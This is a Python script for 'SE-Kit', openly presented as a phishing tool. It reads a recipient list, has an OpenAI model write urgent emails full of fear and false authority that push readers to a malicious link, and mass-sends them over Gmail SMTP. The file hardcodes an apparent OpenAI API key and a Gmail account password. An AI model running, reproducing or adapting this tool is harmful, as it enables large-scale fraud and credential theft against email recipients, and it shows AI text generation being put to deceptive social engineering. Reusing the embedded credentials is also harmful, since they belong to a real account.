#SE-Kit is a tool designed for phishing attacks it achieves this through
#AI generated phishing emails to trick victims into clicking malicious links

import smtplib
import openai
import argparse
import sys
import random

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

#API key for openai
openai.api_key = "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"

#Description and usage for the programs help page
parser = argparse.ArgumentParser(
description='SE-Kit is a tool designed for phishing attacks that achieves this through AI-generated phishing emails to trick victims into clicking malicious links',
usage='-f EmailList.txt -u https://example.com -q "download security extension" -n "BigCompany Security Team"'
)

#Program switches
parser.add_argument('-f', '--file', metavar='', type=str, required=True, help="path to file containing list of email recipients")
parser.add_argument('-u', '--url', metavar='', type=str, required=True, help="malicious link you want to direct the recipient to")
parser.add_argument('-q', '--query', metavar='', type=str, required=True, help="what you want the recipient to do e.g. 'download security extension' or 'login to their account'")
parser.add_argument('-n', '--name', metavar='', type=str, required=True, help="name you want to sign the letter with")

#Parse arguments
args = parser.parse_args()

#Read emails from file line by line
try:
    with open(args.file, "r") as f:
        recipients = [line.strip() for line in f.readlines()]
except argparse.ArgumentTypeError as e:
    print(str(e))
    exit(1)
	
from_email = "autoemailer912@gmail.com"

#Asks AI Question
def ask_openai(query):
    response = openai.Completion.create(
        engine="text-davinci-003",
        prompt=f"{query}\n",
        temperature=0.9,
        max_tokens=700,
    )
    answer = response.choices[0].text.strip()
    return answer

# List of questions to ask
querys = [
    f"Can you write an urgent email asking users to {args.query}? Context: Address the recepient as 'Customer' and sign the letter as {args.name} also overwhelm them with technical terminology, add fear, authority and ask them to visit the following website {args.url}",
    f"Can you write an email informing users about a security breach urging them to {args.query}? Context: Address the recepient as 'Customer' and sign the letter as {args.name} also overwhelm them with technical terminology, add fear, authority and ask them to visit the following website {args.url}",
    f"Can you write an important email asking users to {args.query}? Context: Address the recepient as 'Customer' and sign the letter as {args.name} also overwhelm them with technical terminology, add fear, authority and ask them to visit the following website {args.url}",
]

# Iterate over recipients and send emails
for i, to_email in enumerate(recipients):

    # Choose the query for the AI
    query = random.choice(querys)
    
    # Ask OpenAI for the answer to the current question
    answer = ask_openai(query)
    
    # Create message object instance
    message = MIMEMultipart()

    # Setup the parameters of the message
    message['From'] = from_email
    message['To'] = to_email
    message['Subject'] = 'Security Alert: Action Required'

    # Add body to email
    body = f"{answer}"
    message.attach(MIMEText(body, 'plain'))

    # Create SMTP session
    session = smtplib.SMTP('smtp.gmail.com', 587)

    try:
        # Start TLS for security
        session.starttls()

        # Login to account
        password = "jxqtvvlxpeutafdl"
        session.login(from_email, password)

        # Send email
        text = message.as_string()
        session.sendmail(from_email, to_email, text)

        print(f"Phishing email was sent to {to_email} successfully!")

    except Exception as e:
        print(f"Failed to send email to {to_email}: {str(e)}")

    finally:
        # Close the session
        session.quit()
	
#Notifies user that the script was successfull
print(f"The script was successfully executed!")